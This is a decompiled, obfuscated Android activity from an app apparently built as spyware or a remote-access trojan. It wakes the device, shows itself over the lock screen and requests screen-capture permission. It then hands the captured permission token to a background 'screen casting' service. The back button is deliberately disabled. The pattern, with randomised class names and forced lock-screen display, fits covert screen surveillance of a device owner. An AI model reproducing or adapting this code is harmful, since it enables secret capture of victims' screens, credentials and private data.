package com.storm.safe.rock.activity;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.service.MediaDisplayService;
import com.storm.safe.rock.service.dqtvuisjd;
import p000.AbstractC0003a2;
import p000.AbstractC1120qr;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class qixvbtmo extends Activity {

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.activity.qixvbtmo$a0 */
    public static final class C0247a0 {
        public /* synthetic */ C0247a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0247a0() {
        }
    }

    static {
        new C0247a0(null);
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        boolean z = intent != null;
        StringBuilder sbM38b9 = AbstractC0003a2.m38b9("onActivityResult: requestCode=", i, ", resultCode=", i2, ", data=");
        sbM38b9.append(z);
        t60.m214714d6("qixvbtmo", sbM38b9.toString());
        dqtvuisjd.f52358m1.setPermissionRequesting(false);
        if (i != 100 || i2 != -1 || intent == null) {
            t60.m214726f4("qixvbtmo", "权限被拒绝或数据无效: resultCode=" + i2);
            finish();
            return;
        }
        AbstractC0241a0.f51907a1 = Integer.valueOf(i2);
        AbstractC0241a0.f51908a2 = new Intent(intent);
        AbstractC0241a0.f51909a3 = System.currentTimeMillis();
        t60.m214714d6("MediaProjectionHolder", "权限数据已存储: resultCode=" + i2 + ", 时间戳: " + AbstractC0241a0.f51909a3);
        t60.m214714d6("qixvbtmo", "权限数据已保存");
        Intent intent2 = new Intent(this, (Class<?>) MediaDisplayService.class);
        intent2.putExtra("action", "start");
        intent2.putExtra("resultCode", i2);
        intent2.putExtra("data", intent);
        intent2.putExtra("quality", 55);
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent2);
            } else {
                startService(intent2);
            }
            t60.m214714d6("qixvbtmo", "已启动投屏服务");
        } catch (Exception e) {
            tz0.m214808a8("启动投屏服务失败: ", e.getMessage(), "qixvbtmo", e);
        }
        Intent intent3 = new Intent(AbstractC0003a2.m32b3(getPackageName(), ".MEDIA_PROJECTION_PERMISSION_GRANTED"));
        intent3.setPackage(getPackageName());
        sendBroadcast(intent3);
        finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            if (Build.VERSION.SDK_INT >= 27) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            }
            getWindow().addFlags(2622464);
            Object systemService = getSystemService("power");
            PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
            if (powerManager != null) {
                powerManager.newWakeLock(805306394, "App:MediaProjectionPermission").acquire(3000L);
            }
        } catch (Exception e) {
            t60.m214705c6("qixvbtmo", "设置锁屏显示/唤醒失败", e);
        }
        Object systemService2 = getSystemService("media_projection");
        t60.m214693b4(systemService2, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) systemService2;
        Intent intentCreateScreenCaptureIntent = Build.VERSION.SDK_INT >= 34 ? mediaProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay()) : mediaProjectionManager.createScreenCaptureIntent();
        t60.m214694b5(intentCreateScreenCaptureIntent, "if (Build.VERSION.SDK_IN…CaptureIntent()\n        }");
        dqtvuisjd.f52358m1.setPermissionRequesting(true);
        startActivityForResult(intentCreateScreenCaptureIntent, 100);
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
    }
}
